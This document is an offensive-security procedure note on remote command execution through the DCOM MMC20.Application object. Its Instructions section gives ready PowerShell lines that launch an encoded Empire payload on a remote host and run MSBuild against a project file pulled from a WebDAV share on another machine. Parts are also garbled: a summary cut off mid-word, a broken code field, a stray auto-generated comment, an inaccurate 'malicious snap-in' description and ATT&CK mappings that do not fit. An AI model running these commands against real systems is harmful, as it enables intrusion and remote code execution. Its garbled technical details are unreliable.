---
id: 9932dd71-57f9-41ae-b29e-e0e35173aff0
name: DCOM Shell Command Execution via MMC Application Class
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.099342+00:00'
updated_at: '2023-04-10T20:26:06.250993+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Event Triggered Execution|T1546 - Event Triggered Execution]]'
- '[[Remote Service Session Hijacking|T1563 - Remote Service Session Hijacking]]'
sub_techniques:
- '[[RDP Hijacking|T1563.002 - RDP Hijacking]]'
- '[[Screensaver|T1546.002 - Screensaver]]'
tags:
- '[[Active Directory Attacks]]'
- '[[DCOM Exploitation]]'
- '[[DCOM via MMC Application Class]]'
---

# DCOM Shell Command Execution via MMC Application Class

## Summary

DCOM Shell Command Execution via MMC Application Class is a technique used to execute commands on remote systems via the MMC20.Application COM object. This technique involves an attacker creating a malicious MMC snap-in that loads the MMC20.Application COM object and executes shell commands with sy

## Description

# Description

DCOM Shell Command Execution via MMC Application Class is a technique used to execute commands on remote systems via the MMC20.Application COM object. This technique involves an attacker creating a malicious MMC snap-in that loads the MMC20.Application COM object and executes shell commands with system privileges. The attacker then connects to the remote system and loads the malicious snap-in, allowing them to execute commands on the remote system with the same privileges as the MMC snap-in. This technique can be used to execute commands on remote systems, bypassing traditional security measures such as firewalls and antivirus software.

This technique requires the attacker to have administrative access to the target system, as well as knowledge of the MMC20.Application COM object and how to use it to execute commands. Successful execution of this technique can result in the attacker gaining full control over the target system, including the ability to install malware or steal sensitive data.

 

## Requirements

1. Administrative access to the target system

1. Knowledge of the MMC20.Application COM object and how to use it to execute commands

 

## Defense

1. Disable or restrict DCOM access where possible

1. Monitor for the creation of new MMC snap-ins

1. Implement least privilege access control measures to limit the impact of successful attacks

 

## Objectives

1. Execute commands on remote systems with system privileges

1. Bypass traditional security measures such as firewalls and antivirus software

1. Gain full control over the target system

 

# Instructions

1. To execute shell commands with MMC20.Application, follow the steps below:
1. Create an instance of the MMC20.Application COM object using the following command:
   `$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1"))`
2. Use the `ExecuteShellCommand` method of the `Document.ActiveView` object to execute shell commands. For example:
   `$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)`
   `$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")`
   `$com.Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")`
3. The `ExecuteShellCommand` method takes the following arguments:
   `ExecuteShellCommand(Command, Parameters, Directory, WindowStyle)`
   - `Command`: The command to execute.
   - `Parameters`: The parameters to pass to the command.
   - `Directory`: The working directory for the command.
   - `WindowStyle`: The window style for the command (e.g. hidden, maximized, minimized).

 



**Code**: [[PS C:\> $com = [activator]::CreateInstance([type]:]]



> This JSON object provides details on how to execute shell commands with the MMC20.Application COM object. The `ExecuteShellCommand` method of the `Document.ActiveView` object is used to execute shell commands. The `instruction` field provides step-by-step instructions on how to use the `ExecuteShellCommand` method, including the arguments it takes. The `text` field provides an overview of the MMC20.Application COM object and the `ExecuteShellCommand` method. The `data` field provides example usage of the `ExecuteShellCommand` method, including a weaponized example with MSBuild. The `lang` field specifies that the code examples are in PowerShell.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Event Triggered Execution|T1546 - Event Triggered Execution]]
- [[Remote Service Session Hijacking|T1563 - Remote Service Session Hijacking]]

### Sub-Techniques

- [[RDP Hijacking|T1563.002 - RDP Hijacking]]
- [[Screensaver|T1546.002 - Screensaver]]

## Tags

- [[Active Directory Attacks]]
- [[DCOM Exploitation]]
- [[DCOM via MMC Application Class]]


